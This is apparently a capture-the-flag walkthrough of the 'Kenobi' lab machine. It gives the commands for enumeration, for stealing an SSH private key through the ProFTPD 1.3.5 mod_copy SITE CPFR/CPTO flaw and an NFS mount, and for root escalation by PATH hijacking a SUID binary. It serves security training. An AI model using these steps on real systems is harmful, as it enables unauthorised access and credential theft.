## Kenobi

### Information
IP Address: 10.10.156.144

### Recon

Let us start with a simple nmap scan to check what services the target machine is hosting.

````
export ip=<TARGET IP>
nmap $ip
````

> PORT     STATE SERVICE
> 21/tcp   open  ftp
> 22/tcp   open  ssh
> 80/tcp   open  http
> 111/tcp  open  rpcbind
> 139/tcp  open  netbios-ssn
> 445/tcp  open  microsoft-ds
> 2049/tcp open  nfs

**Question**: Scan the machine with nmap, how many ports are open?

> 7

We can enumerate the number of shares using nmap or using enum4linux

```
smbclient -L //$ip -N
enum4linux -S $ip
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $ip
```

> ​    Sharename       Type      Comment
> ---------       ----      -------
> ​    print$          Disk      Printer Drivers
> ​    anonymous       Disk      
> ​    IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))

**Question** Using the nmap commmand, how many shares have been found

> 3

### Anonymous Share

Let's inspect the Anonymous share.  The "-N" flag is used to specify that no password or user credentials should be used in the connection.

```
smbclient //$ip/anonymous -N
```

Great! We have logged in without a password in the Anonymous Share. There is a single log.txt file in here with some information about the FTP server. We can download it to our local machine using:

```
get log.txt
```

**We can see that the user kenobi generated an ssh key pair to login with key authentication using SSH.**

**Question** Once you're connected, list the files on the share. What is the file can you see?

> log.txt

**Question** What port is FTP running on?

> 21

### NFS Mount

We can also further enumerate the NFS service. Port 111 is running the service rpcbind. RPCbind is a service that maps RPC (Remote Procedure Call) program numbers to the IP addresses and ports on which the corresponding RPC servers are listening. The rpcbind service is typically started at boot time and is necessary for the operation of many RPC-based services, such as **NFS (Network File System)** and NIS (Network Information Service).

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.156.144
```

> PORT    STATE SERVICE
> 111/tcp open  rpcbind
> | nfs-showmount: 
> |_  /var *

**Question** What mount can we see?

> /var

### FTP

```
nmap -sV -p 21 $ip
nc $ip 21
```

**Question** Use netcat to connect to the machine on the FTP port. What is the version?

> ProFTPD 1.3.5

### Searchsploit

We can consult searchsploit or exploit-db.com for known exploits that are actionable against our ftp server version.

```
searchsploit proftpd 1.3.5
```

**Question** How many exploits are there for the ProFTPd running?

> 4

The vulnerability of interest details a critical issue with proftpd installations that use the
mod_copy module's SITE CPFR/SITE CPTO commands. Mod_copy allows these commands
to be used by *unauthenticated clients*. 

Meaning we can use these commands to copy a any file to any destination we like. We know that the FTP service is running as the **Kenobi** user (from the file on the share) and an ssh key was generated for that user. Hence we can copy this file to the /var mountable share we know exists and access it!

```
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

Now we just have to mount the  /var/tmp directory to our machine:

```
mkdir tmp
sudo mount -t nfs $ip:/var/tmp ./tmp
```

> Additional Information:
>
> The -nolock option tells the mount command to not use the lock manager and instead mount the file system as if it were a local file system. This means that any files on the file system can be accessed and modified without any locking mechanisms in place.

We can list the files inside it, copy the file to our local machine and login using the id_rsa file stored within (after changing its permissions `chmod 600 id_rsa`)

```
ssh -i rsa_id kenobi@$ip
```

Great! Now that we are in, we can access the user.txt flag using:

```
cat /home/kenobi/user.txt
```

### Privilege Escalation

The technique that is going to be used will take advantage of SUID bits and Path variable manipulation.

First we will list files with the SUID bit set:

```
find / -perm -u=s -type f 2>/dev/null
```

**Question** What file looks particularly out of the ordinary? 

> /usr/bin/menu 

After running the binary we have 3 options and the output of the 3 is familiar.

**Question** Run the binary, how many options appear?

> 3

In order to verify our suspicions we can run the command:

```
string /usr/bin/menu
```

> Additional Informatio:
>
> The "strings" command in Linux is a command-line utility that is used to display printable strings from a binary file. This command can be useful for analyzing and debugging binary files, as well as for extracting useful information from files such as executables, shared libraries, and core dumps.

The output of this command showcases all 3 commands in charge of providing the different outputs:

> curl -I localhost
> uname -r
> ifconfig

Great so we know that the path to each of these commands is not provided, hence the OS uses the PATH variable to find the location of each of these files.

Let's take a look at the PATH variable

```
echo $PATH
```

> **/home/kenobi/bin**:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

Great! We can use /home/kenobi/bin to drop our payload. Alternatively we could also drop it inside /tmp which we know we could write to and add this location to the PATH environmental variable using `export PATH=/tmp:$PATH`.

```
cd /home/kenobi
mkdir bin
cd bin
echo /bin/sh > curl
chmod 777 curl
/usr/bin/menu
1
```

Great Job! You just escalated your privileges to root!

```
cat /root/root.txt
```

> <Redacted>

Congrats! You have just finished the Kenobi room!
